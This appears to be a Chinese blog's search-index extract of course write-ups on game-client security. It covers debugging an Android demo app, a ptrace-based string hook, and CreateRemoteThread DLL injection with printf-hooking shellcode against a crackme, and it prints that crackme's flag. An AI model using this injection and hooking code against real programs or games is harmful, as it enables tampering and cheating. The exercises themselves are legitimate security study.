src="2023-10-06-01-08-30-image.png"></p></li><li><p>添加环境变量</p><p>将<code>$sdkPath/platform-tools/</code></p><p><code>$sdkPath//opt/android-studio-sdk/ndk/26.0.10792818/toolchains/llvm/prebuilt/linux-x86_64/bin/</code>添加到环境变量，ndk变量需要根据自己的环境情况进行添加</p></li><li><p>创建Android Virtual Device(AVD)虚拟机</p><p>打开Virtual Device Manager</p><p>选择创建，按照个人习惯，机型选择<code>Pixel XL</code>，镜像选择<code>Oreo</code>(API27 x86 Android 8.1)，如果是64位环境，选择<code>Tiramisu</code>(API33 x86_64 Android 13.0)</p></li></ol><p>   将Device Frame的勾取消，点击完成即可创建</p><h4 id="Android-Studio调试"><a href="#Android-Studio调试" class="headerlink" title="Android Studio调试"></a>Android Studio调试</h4><p>选择右图<code>Profile or Debug APK</code></p><p><img src="2023-10-06-01-20-26-image.png"></p><p>有可能打开后和左图一样，没有<code>Profile or Debug APK</code>选项，如果出现该情况，进入到插件设置，启用Android APK Support和Android NDK Support并重启Android Studio</p><img src="2023-10-06-01-22-03-image.png" title="" alt="" width="573"><p>选择<code>Profile or Debug APK</code>后，选中需要调试的apk文件</p><p><img src="2023-10-06-01-25-31-image.png"></p><p>左侧选择java并找到要调试的类，打开编译后的smali代码，对smali代码不了解的可以使用jadx工具对照查看反编译的java代码</p><p><img src="2023-10-06-01-28-14-image.png"></p><blockquote><p>虽然jadx也可以进行动态调试，但不推荐，很多情况下无法看到寄存器的值</p></blockquote><p>选择调试的AVD虚拟机并编辑调试配置文件</p><p><img src="2023-10-06-01-29-30-image.png"></p><p>将Debuger类型修改为Java Only，不修改的情况下会默认附加lldb调试器，导致ida调试器无法附加</p><img src="2023-10-06-01-30-49-image.png" title="" alt="" width="523"><p>在Device Manager中启动AVD虚拟机</p><p><img src="2023-10-06-01-33-43-image.png"></p><p>下断点并点击调试</p><p><img src="2023-10-06-01-34-24-image.png"></p><p><img src="2023-10-06-01-35-02-image.png"></p><p>正常情况下程序会断下并进入调试状态，但有时会出现无法调试的情况，如果发生该情况，到插件管理禁用Android APK Support和Android NDK Support(可不进行重启)</p><p>剩下的调试部分不做介绍</p><h4 id="Ida调试"><a href="#Ida调试" class="headerlink" title="Ida调试"></a>Ida调试</h4><p>确保上述操作AVD虚拟机启动和软件进入调试状态</p><p>提取程序的lib文件(使用unzip解压apk文件，在lib目录中找到对于处理器架构的so文件)</p><p>将Ida的dbgsrv目录下的对应架构的调试服务器上传到AVD虚拟机中，例如本题为<code>android_x86_server</code>，开启29346端口转发(开启转发失败时去掉-s选项)</p><p><img src="2023-10-06-01-50-32-image.png"></p><p>adb shell进入到AVD虚拟机的命令行，su切换到root权限，进入dbgsrv目录</p><p><img src="2023-10-06-01-43-05-image.png"></p><p>为<code>android_x86_server</code>添加可执行权限并运行</p><p><img src="2023-10-06-01-44-19-image.png"></p><p>启动ida32并选择要调试的so文件(不建议修改文件名)</p><p>找到需要调试的函数下断点</p><p>选择调试器为<code>Remote Linux debugger</code></p><p><img src="2023-10-06-01-47-07-image.png"></p><p>Debugger-&gt;Process Option设置Hostname为<code>127.0.0.1</code></p><img src="2023-10-06-01-49-22-image.png" title="" alt="" width="500"><p>Debugger-&gt;Attach to process选择要调试的进程</p><img src="2023-10-06-01-55-00-image.png" title="" alt="" width="500"><p>出现询问模块名相同选择<code>Same</code></p><img src="2023-10-06-01-55-55-image.png" title="" alt="" width="507"><p>Ida附加后会自动断下，按F9运行一次</p><p>回到Android Studio单步执行native函数，Ida会在断点处断下</p><p>剩下的调试部分不做介绍</p>]]></content>
    
    
    <categories>
      
      <category>腾讯游戏客户端安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>游戏客户端开发基础-移动篇(视频习题)</title>
    <link href="/2023/10/02/TencentGameClient/%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80-%E7%A7%BB%E5%8A%A8%E7%AF%87(%E8%A7%86%E9%A2%91%E4%B9%A0%E9%A2%98)/"/>
    <url>/2023/10/02/TencentGameClient/%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80-%E7%A7%BB%E5%8A%A8%E7%AF%87(%E8%A7%86%E9%A2%91%E4%B9%A0%E9%A2%98)/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/noxke/TencentGameClientOpenCourse">GitHub - noxke&#x2F;TencentGameClientOpenCourse: 腾讯游戏客户端公开课2023 腾讯菁英班</a></p><h3 id="1-静态分析"><a href="#1-静态分析" class="headerlink" title="1.静态分析"></a>1.静态分析</h3><h4 id="Java层"><a href="#Java层" class="headerlink" title="Java层"></a>Java层</h4><p>使用jadx打开题目<code>gslab.demo.apk</code>文件，查看<code>AndroidManifest.xml</code>文件获取软件入口activity为<code>com.example.x86demo.MainActivity</code></p><p>查看该入口activity类的<code>onCreate</code>方法</p><p><img src="2023-10-05-22-42-18-image.png"></p><p>TextView对象<code>tv</code>设置的字符串来自<code>stringFromJNI</code>方法</p><p><img src="2023-10-05-22-43-55-image.png"></p><p>查看其余部分，<code>stringFromJNI</code>是<code>native-lib</code>中的native函数</p><h4 id="Native层"><a href="#Native层" class="headerlink" title="Native层"></a>Native层</h4><p>该软件提供了<code>armabi-v7a</code>和<code>x86</code>两种处理器架构的<code>libnative-lib.so</code>文件，此处对arm架构so文件进行分析</p><p>使用readelf命令查看<code>libnative-lib.so</code>的导出函数</p><img src="2023-10-05-22-50-46-image.png" title="" alt="" width="527"><p><code>stringFromJNI</code>导出函数的偏移地址为<code>0x08bdd</code>，完整导出名称为<code>Java_com_example_x86demo_MainActivity   _stringFromJNI</code></p><blockquote><p>arm指令集每条指令长度为32位，存在指令对其，指令地址低两位均为0，而此处偏移地址最低位为1，表示处理器执行到该处时进入Thumb模式，指令长度变为16位或32位，实际指令偏移地址为<code>0x8bdc</code></p></blockquote><p>使用ida32打开<code>libnative-lib.so</code>文件，定位到导出函数，指令长度大多为16位，表示处理器执行该函数时处于Thumb模式</p><p>反编译查看该函数</p><img src="2023-10-05-22-58-44-image.png" title="" alt="" width="527"><p>程序使用C++的string类构造string对象并返回，注意到除了<code>sub_E36E2CA6</code>函数外其它函数均为库函数，因此选择该函数进行hook</p><h3 id="2-动态调试"><a href="#2-动态调试" class="headerlink" title="2.动态调试"></a>2.动态调试</h3><blockquote><p>使用真机(android 13)进行调试，调试工具为android studio和ida</p></blockquote><h4 id="Java层-1"><a href="#Java层-1" class="headerlink" title="Java层"></a>Java层</h4><p>对<code>stringFromJNI</code>调用处的smali代码下断点，连接设备进行调试</p><img src="2023-10-05-23-06-29-image.png" title="" alt="" width="533"><p>程序在断点处断下，单步跳过查看<code>stringFromJNI</code>函数的返回值(v1寄存器)</p><img title="" src="2023-10-05-23-08-51-image.png" alt="" width="533"><p>函数返回结果为字符串对象<code>Hello from C++</code></p><p>继续运行程序，屏幕显示<code>Hello from C++</code>字符串</p><h4 id="Native层-1"><a href="#Native层-1" class="headerlink" title="Native层"></a>Native层</h4><p>开启adb端口转发，将ida的dbgsrv上传到手机，进入shell切换到root权限启动dbgsrv</p><p><img src="2023-10-05-23-17-30-image.png"></p><p>android studio上开启调试，程序在smali代码断下</p><p>ida对<code>stringFromJNI</code>函数下断点，连接调试器并附加到<code>com.example.x86demo</code>进程，按F9继续运行</p><img src="2023-10-05-23-18-48-image.png" title="" alt="" width="532"><p>android studio单步执行，ida上程序在<code>stringFromJNI</code>函数断下</p><img src="2023-10-05-23-20-56-image.png" title="" alt="" width="507"><blockquote><p>此处处理器处于Thumb模式</p></blockquote><p>断点到<code>sub_E3722CA6</code>函数内部</p><img src="2023-10-05-23-22-52-image.png" title="" alt="" width="505"><p>函数只做了参数传递并调用<code>sub_E3723258</code>函数，<code>sub_E3722CA6</code>的参数为<code>R0</code>寄存器，值为<code>0xFF98C0E8</code>，显然为一个地址，跳转到该地址处</p><img src="2023-10-05-23-26-11-image.png" title="" alt="" width="513"><p>猜测该位置为一个结构体，结构体第一个整数为0x11，第二个整数为0x0E，第三个整数为<code>0x77EB6850</code>，第三个数明显为地址，跳转到该地址处</p><img src="2023-10-05-23-28-16-image.png" title="" alt="" width="509"><p>该地址处为字符串<code>Hello from C++</code>，对该字符串进行修改测试</p><img src="2023-10-05-23-29-30-image.png" title="" alt="" width="511"><p>ida使用F9运行，android studio单步断下，查看<code>stringFromJNI</code>返回值</p><img src="2023-10-05-23-30-42-image.png" title="" alt="" width="509"><p>返回值变为了上面修改的字符串，继续运行程序，屏幕上显示修改后的字符串</p><img src="2023-10-05-23-32-24-image.png" title="" alt="" width="451"><h3 id="3-使用ptrace注入并hook程序"><a href="#3-使用ptrace注入并hook程序" class="headerlink" title="3.使用ptrace注入并hook程序"></a>3.使用ptrace注入并hook程序</h3><blockquote><p>上述分析中选择<code>sub_E36E2CA6</code>函数进行hook，该函数偏移为<code>0x8ca6</code>，后续称为<code>proc</code></p><p>该函数的调用关系为<code>onCreate-&gt;stringFromJNI-&gt;proc</code>，由于该函数在程序启动时执行，几乎没有等待时间，所以在正常执行的情况下不能够保证100%hook成功</p></blockquote><p>本题使用traphook的方式修改proc函数的参数，思路如下：</p><ol><li><p>ptrace在proc函数开始位置设置软件断点</p></li><li><p>waitpid捕获进程停止信息</p></li><li><p>ptrace获取proc函数参数R0寄存器，得到字符串地址</p></li><li><p>ptrace修改字符串地址处的字符串</p></li><li><p>ptrace禁用断点，恢复程序执行</p></li></ol><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p>ptrace函数需要待附加进程的pid，使用<code>pidof com.example.x86demo</code>命令可以获得软件的<code>pid</code></p><p>想要hook <code>proc</code>函数，需要知道其内存中的加载地址，在静态分析中得到了其偏移地址<code>proc_offset = 0x8ca6</code>，还需要<code>libnative-lib.so</code>文件加载的基地址才能计算出<code>proc</code>函数的地址，安卓进程加载的库文件信息可以在<code>/proc/pid/maps</code>文件中找到</p><img src="2023-10-06-00-03-12-image.png" title="" alt="" width="581"><p>如图，本次程序运行<code>libnative-lib.so</code>的加载地址为<code>lib_base = e381d000</code>，<code>proc</code>函数的地址为<code>proc_addr = lib_base + proc_offset</code></p><p>c语言中使用popen函数执行命令行目录并获取结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 获取进程pid和libnative-lib.so加载的基地址</span><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br>    fp = popen(<span class="hljs-string">&quot;pidof com.example.x86demo &amp;&amp; cat /proc/`pidof com.example.x86demo`/maps | grep libnative-lib.so&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    fread(cli_output, <span class="hljs-number">1</span>, <span class="hljs-number">1024</span>, fp);<br>    pclose(fp);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(cli_output) != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">sscanf</span>(cli_output, <span class="hljs-string">&quot;%d%lx&quot;</span>, &amp;demo_pid, &amp;lib_base);<br>        <span class="hljs-keyword">if</span> (lib_base == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;demo_pid: %d\n&quot;</span>, demo_pid);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;libnative-lib.so image base: 0x%lx\n&quot;</span>, lib_base);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="2023-10-06-00-06-29-image.png"></p><p>使用ptrace附加到进程并将<code>proc</code>函数第一条指令修改为软件断点，设置断点前需要保存原始指令，确保后续能够使程序正确运行，设置断点后恢复进程运行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bp_code = <span class="hljs-number">0x0000BEFF</span>;  <span class="hljs-comment">// 设置FF号断点</span><br><span class="hljs-comment">// 需要hook的函数偏移</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> proc_offset = <span class="hljs-number">0x8ca6</span>;<br><span class="hljs-comment">// 需要hook的函数地址</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> proc_addr = lib_base + proc_offset;<br>    <span class="hljs-comment">// 附加到目标进程</span><br>ptrace(PTRACE_ATTACH, pid, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>waitpid(pid, &amp;status, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 先保存断点前的指令，再将其设置为断点代码</span><br>ori_code = ptrace(PTRACE_PEEKDATA, pid, (<span class="hljs-type">void</span> *)proc_addr, <span class="hljs-literal">NULL</span>);<br>ptrace(PTRACE_POKEDATA, pid, (<span class="hljs-type">void</span> *)proc_addr, (<span class="hljs-type">void</span> *)bp_code);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;set breakpoint at 0x%lx\n&quot;</span>, proc_addr);<br>ptrace(PTRACE_CONT, pid, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure><p>当处理器执行到软件断点时会发出<code>SIGTRAP</code>信号，使用waitpid捕获断点信号，并获取寄存器信息，判断PC寄存器地址是否为断点地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 捕获断点</span><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>&#123;<br>    waitpid(pid, &amp;status, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (WIFSTOPPED(status) &amp;&amp; WSTOPSIG(status) == SIGTRAP)<br>    &#123;<br>        <span class="hljs-comment">// 获取寄存器信息</span><br>        ptrace(PTRACE_GETREGS, pid, <span class="hljs-literal">NULL</span>, &amp;regs);<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pc = regs.uregs[<span class="hljs-number">15</span>];<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;break at 0x%lx\n&quot;</span>, pc);<br>        <span class="hljs-keyword">if</span> (pc == proc_addr)<br>        &#123;<br>            <span class="hljs-comment">// hook操作</span><br>        &#125;<br>    &#125;<br>    ptrace(PTRACE_CONT, pid, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>当程序在设置的断点处断下后，寄存器R0的值为proc函数的参数，其值为地址，<code>R0+8</code>为字符串地址，使用ptrace修改<code>R0+8</code>处的字符串，实现对<code>stringFromJNI</code>返回值的修改</p><p>完成修改后需要将断点恢复为原始指令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 获取R0寄存器</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r0 = regs.uregs[<span class="hljs-number">0</span>];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> str_addr = ptrace(PTRACE_PEEKDATA, pid, (<span class="hljs-type">void</span> *)(r0 + <span class="hljs-number">8</span>), <span class="hljs-literal">NULL</span>);<br><span class="hljs-type">char</span> ori_str[<span class="hljs-number">0x20</span>];<br><span class="hljs-type">char</span> new_str[<span class="hljs-number">0x20</span>];<br><span class="hljs-built_in">strcpy</span>(new_str, hack_str);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x20</span>; i += <span class="hljs-number">4</span>)<br>&#123;<br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)(ori_str + i) = ptrace(PTRACE_PEEKDATA, pid, (<span class="hljs-type">void</span> *)(str_addr + i), <span class="hljs-literal">NULL</span>);<br>    ptrace(PTRACE_POKEDATA, pid, (<span class="hljs-type">void</span> *)(str_addr + i), (<span class="hljs-type">void</span> *)(*(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *)(new_str + i)));<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;str at 0x%lx\n&quot;</span>, str_addr);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ori str: %s\n&quot;</span>, ori_str);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;new str: %s\n&quot;</span>, new_str);<br><span class="hljs-comment">// 恢复原来的指令</span><br>ptrace(PTRACE_POKEDATA, pid, (<span class="hljs-type">void</span> *)proc_addr, (<span class="hljs-type">void</span> *)ori_code);<br></code></pre></td></tr></table></figure><p>编译程序并上传到手机测试</p><p><img src="2023-10-06-00-21-03-image.png"></p><img src="2023-10-06-00-22-22-image.png" title="" alt="" width="296"><blockquote><p>x86的hook实现与arm的实现基本相同，除了<code>proc</code>函数的偏移地址不同，以及断点指令不同以外，还需要注意x86处理器在执行int3断点后会将EIP+1，捕获断点后除了将断点指令恢复，还需要将EIP寄存器恢复</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>腾讯游戏客户端安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>游戏客户端开发基础-PC篇</title>
    <link href="/2023/09/26/TencentGameClient/%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80-PC%E7%AF%87/"/>
    <url>/2023/09/26/TencentGameClient/%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80-PC%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/noxke/TencentGameClientOpenCourse">GitHub - noxke&#x2F;TencentGameClientOpenCourse: 腾讯游戏客户端公开课2023 腾讯菁英班</a></p><h3 id="1-程序分析"><a href="#1-程序分析" class="headerlink" title="1.程序分析"></a>1.程序分析</h3><p>使用ida打开crackme.exe，进入到程序的主逻辑函数，注意到有大量的xmm寄存器，但是不含call指令，先忽略，注意到两个特殊部分：</p><p><img src="pic2.png"></p><p>左图中调用了CreateThread函数创建子线程运行StartAddress处函数，右侧含有分支判断，完成判断后sleep并返回，猜测该处与程序的判断逻辑有关</p><p>F5查看反编译代码</p><img src="pic3.png" title="" alt="" width="396"><p>末尾进行了数据串的比较，后根据比较结果为v32地址处的4个字节赋值，紧接着两个字节赋值<code>0x0a,0x0d</code>，换行回车符号，猜测v32地址处为输出字符串，结合测试时的输出<code>错误</code>，猜测<code>0xCBF9DBB4 0x8FFFCBD5</code>经过异或后为gbk编码格式的字符串，在线编码工具测试，猜测成立</p><img src="pic4.png" title="" alt="" width="485"><p>显然，v37处储存的内容影响最后的输出结果，对<code>v32=v37</code>下断点启动调试，随意输入字符串后在该处断下，查看v32内容</p><p><img src="pic5.png"></p><p>显然, v37为输入的原内容，根据比较部分可以得知，<code>v37-48</code>处为flag</p><p><img src="pic6.png"></p><p>得到程序flag<code>HiGWDUuXQS6wVHBTp0ERfJe6VqprMqD1</code></p><img src="pic7.png" title="" alt="" width="404"><p>分析剩余部分得到程序的输入函数和输出函数，后续将称其为<code>printf scanf</code></p><p><img src="pic8.png"></p><h3 id="2-DLL注入分析"><a href="#2-DLL注入分析" class="headerlink" title="2.DLL注入分析"></a>2.DLL注入分析</h3><p>题目要求使用<code>CreateRemoteThread</code>api进行注入</p><blockquote><p>最基础的代码注入方式, 使用<a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread"><code>CreateRemoteThread</code></a>在目标进程下创建远程线程, 调用<a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya"><code>LoadLibraryA</code></a>加载DLL到目标进程, DLL加载&#x2F;卸载时调用<code>DllMain</code>函数, 执行注入DLL中的代码, <code>LoadLibraryA</code>参数需要先写入目标进程的内存, 使用<a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex"><code>VirtualAllocEx</code></a>在目标进程内存下分配内存, 使用<a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory"><code>WriteProcessMemory</code></a>将需要注入的DLL地址写入目标内</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);<br>pRemoteBuf = VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);<br>WriteProcessMemory(hProcess, pRemoteBuf, dllPath, dwBufSize, <span class="hljs-literal">NULL</span>);<br>hMod = GetModuleHandleA((LPCSTR)<span class="hljs-string">&quot;kernel32.dll&quot;</span>);<br>pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, <span class="hljs-string">&quot;LoadLibraryA&quot;</span>);<br>CreateRemoteThread(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, pThreadProc, pRemoteBuf, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure><blockquote><p>创建远程线程时传入的<code>LoadLibraryA</code>地址并不是直接获取目标进程中的函数地址, 因为系统DLL在不同进程中加载地址相同</p></blockquote><p>编写一个输出字符串的DLL进行注入测试<br><img title="" src="pic9.png" alt="" width="359"></p><p><img src="pic10.png"></p><p>注入creackme.exe失败，但注入其他程序正常，重新分析代码，分析<code>CreateThread</code>函数创建的线程执行的<code>StartAddress</code>处代码，找到关键位置</p><p><img src="pic11.png"></p><p>此处将<code>LoadLibraryExW</code>函数的内存权限修改为可写入，然后将第一个字节patch成-61（0xC3, ret指令），将指令第一行修改为ret指令，将<code>LoadLibraryExW</code>函数patch掉了，因此<code>LoadLibraryA</code>函数也无法正常使用</p><p><img src="pic12.png"></p><p>不过中间有10秒的sleep,在启动后就注入即可</p><p><img src="pic13.png"></p><h3 id="3-hook代码"><a href="#3-hook代码" class="headerlink" title="3.hook代码"></a>3.hook代码</h3><p>将输出结果修改称正确，patch一下分支语句或者将错误的gbk编码patch成正确就可以，但是题目要求用DLL注入hook程序，因此此处用注入的DLL修改程序，hook掉<code>printf</code>函数，思路如下</p><blockquote><p>将<code>printf</code>前几行指令修改为跳转指令，跳转到注入的shellcode中，在shellcode中判断<code>printf</code>的参数（即待输出的字符串）是否为<code>错误</code>，如果为<code>错误</code>，将其修改为<code>正确</code>，替换完成后在shellcode中执行<code>printf</code>前几行被替换的指令，然后返回到<code>printf</code>函数继续执行，输出修改后的字符串</p></blockquote><p>printf修改前后代码:</p><img src="pic14.png" title="" alt="" width="528"><p>修改前前4条指令为将寄存器参数压入堆栈，此处将其修改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nasm">mov eax, $shellcode<br>push rax<br>ret<br></code></pre></td></tr></table></figure><p>将shellcode的地址压入堆栈中，使用ret指令跳转到shellcode代码出，shellcode代码如下（前后填充的nop省略）</p><img src="pic15.png" title="" alt="" width="521"><p>主要代码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nasm">mov eax, [rcx]         ; 将printf第一个参数(输出字符串)的前四个字节传送到eax<br>cmp eax, 0xF3CEEDB4    ; 判断这四个字节是否为错误两个字的gbk编码<br>jne $+0x8              ; 不是错误两个字的gbk编码则跳过接下来两条指令<br>mov eax, 0xB7C8FDD5    ; 如果是错误两个字的gbk编码，将其修改为正确两个字的gbk编码<br>mov [rcx], eax         ; 将这四个字节写回输出字符串，完成替换<br>;原printf函数前4条指令    ; 为printf完成参数压栈<br>mov rax, $printf+0x20  ; printf的指令位置，跳过修改的代码<br>push rax               ; push ret压栈返回<br>ret<br></code></pre></td></tr></table></figure><p>只需要在注入的DLL中计算printf的地址，将地址写入shellcode,将shellcode写入可执行内存，再hook掉printf的代码即可完成修改操作</p><p>设置hook代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">set_hook</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">// hook printf函数</span><br>    DWORD64 pProc;<br>    DWORD64 pProcOffset = <span class="hljs-number">0x1020</span>;<br>    HMODULE hModule = GetModuleHandle(nullptr);<br>    DWORD_PTR baseAddress = reinterpret_cast&lt;DWORD_PTR&gt;(hModule);<br>    pProc = (DWORD64)baseAddress + pProcOffset;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nhook proc addr : 0x%llx\n&quot;</span>, pProc);<br>    <span class="hljs-comment">// 修改shellcode中的返回地址 printf+0x10</span><br>    *((DWORD64 *)((<span class="hljs-type">uint8_t</span> *)shellcode + <span class="hljs-number">0x50</span> - <span class="hljs-number">0x1A</span>)) = (pProc + <span class="hljs-number">0x10</span>);<br>    <span class="hljs-comment">// 写入shellcode</span><br>    LPVOID shellcodeBuf = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x50</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(shellcodeBuf, shellcode, <span class="hljs-number">0x50</span>);<br>    DWORD64 dwShellcodeBuf = (DWORD64)shellcodeBuf;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nshell code addr : 0x%llx\n&quot;</span>, dwShellcodeBuf);<br>    <span class="hljs-comment">// 修改函数内存保护权限</span><br>    VirtualProtect((LPVOID)pProc, <span class="hljs-number">20</span>, PAGE_EXECUTE_READWRITE, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-comment">// 修改hookcode中的shellcode地址</span><br>    *((DWORD64 *)((<span class="hljs-type">uint8_t</span> *)hookcode + <span class="hljs-number">6</span>)) = dwShellcodeBuf;<br>    <span class="hljs-comment">// 获取进程句柄</span><br>    HANDLE hProcess = GetCurrentProcess();<br>    <span class="hljs-comment">// hook printf函数</span><br>    WriteProcessMemory(hProcess, (LPVOID)pProc, hookcode, <span class="hljs-number">20</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>由于PE文件加载时会进行重定向操作，所以printf函数的地址不固定，需要通过PE文件加载的基地址+函数偏移量得到printf函数的准确地址，另外shellcode需要申请可执行内存块确保指令可以正常执行，需要修改printf函数的内存块可写，修改其前几行指令</p><p>注入后运行程序，任意输入均返回正确e</p>]]></content>
    
    
    <categories>
      
      <category>腾讯游戏客户端安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
